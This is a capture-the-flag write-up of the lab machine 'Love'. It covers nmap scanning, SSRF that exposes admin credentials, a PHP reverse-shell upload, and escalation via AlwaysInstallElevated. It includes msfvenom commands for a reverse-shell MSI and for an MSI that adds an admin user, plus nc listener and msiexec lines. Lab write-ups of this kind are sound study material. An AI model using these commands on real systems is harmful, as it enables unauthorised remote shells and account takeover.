# Love

## Scanning 

`sudo nmap -sC -sV -oN nmap/initial 10.10.10.239 -v`

* `staging.love.htb/organizationName=ValentineCorp/`

* Gobuster

![image](https://user-images.githubusercontent.com/12052283/127886977-ba4f12c2-82ff-4b80-9a12-99f6da03adf0.png)


### Open ports

```
Discovered open port 139/tcp on 10.10.10.239
Discovered open port 443/tcp on 10.10.10.239
445/tcp microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
80/tcp Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
Discovered open port 135/tcp on 10.10.10.239
3306/tcp mysql?
5000/tcp  www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Users

```
admin:@LoveIsInTheAir!!!! -> creds of http://love.htb/admin/
Phoebe -> user from Windows Machine
```


## Endpoints

```
http://www.love.htb/home.php
http://staging.love.htb
```


## Vuln

```
Got SSRF in http://staging.love.htb/demo

Unrestricted File Upload while uploading a photo making a php rev shell possible

Abused AlwaysInstallElevated to get root
```

## Getting root

* Got root while abusing `AlwaysInstallElevated`

## Notes

* Found `staging.love.htb/organizationName=ValentineCorp/` in nmap scan. So I edited `/etc/hosts` with `10.10.10.239 love.htb staging.love.htb` and got navigated to `http://staging.love.htb`

![image](https://user-images.githubusercontent.com/12052283/127888286-773176b1-af4e-489a-8fb1-1a0f23e63aa0.png)

* Pressing in `demo` got to a free file scanner so I tried SSRF. Doing `http://localhost:5000` got creds for `http://love.htb/admin/`. Port 5000 because in nmap is saying 403 forbiden so I assumed I could SSRF so the server thinks the requests is internaly made and like that I have permission

![image](https://user-images.githubusercontent.com/12052283/127890660-ab17ab40-2028-454c-aae3-a4929d700f79.png)

* Creating user to get shell using php reverse shell for windows and connected as phoebe

![image](https://user-images.githubusercontent.com/12052283/127893881-931eb776-eba2-4ad5-80c8-f14d822ecefa.png)

* Login with that user while listening on port 9999 using `sudo nc -lvnp 9999`

![image](https://user-images.githubusercontent.com/12052283/127894003-a1d24536-4164-45cc-8d21-750eb4c1612d.png)

* Got shell when login

![image](https://user-images.githubusercontent.com/12052283/127894210-a990a6fc-4c02-45dd-9d2b-cf3797809e3c.png)

* Got creds in C:\xampp\passwords.txt

![image](https://user-images.githubusercontent.com/12052283/127894537-270d6781-2e21-4893-b1bf-121686f7323c.png)

* Got `user.txt` in C:\Users\Phoebe\Desktop\user.txt

* Runned winPEAS and found AlwaysInstallElevated ON

* Running `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` and `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` returned `1` meaning users of any privilege can install (execute) *.msi* files as NT AUTHORITY\SYSTEM

* I could create a metasploit payload using `msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi` and then executing that `alwe.msi` on the windows machine and user `rottenadmin` is NT AUTHORITY\SYSTEM , then i only needed to change from user `Phoebe` to user `rottenadmin`

* But the best way to escalate is to create a reverse shell using `msfvenom -p windows/x64/shell_reverse_tcp LHOST=MY_IP LPORT=MY_LISTENING_PORT -f msi -o reverse.msi`, upload `reverse.msi` to the windows machine, start listening on my local machine using `sudo nc -lvnp MY_LISTENING_PORT` and then, inside the windows machine, run `msiexec /quiet /qn /i reverse.msi` to trigger the reverse shell. After that I got root in the reverse shell.

 ![image](https://user-images.githubusercontent.com/12052283/127909554-97ebbdfc-8d22-46b3-9689-dfe9b2f07923.png)


# References

* https://portswigger.net/web-security/ssrf

* https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

* https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated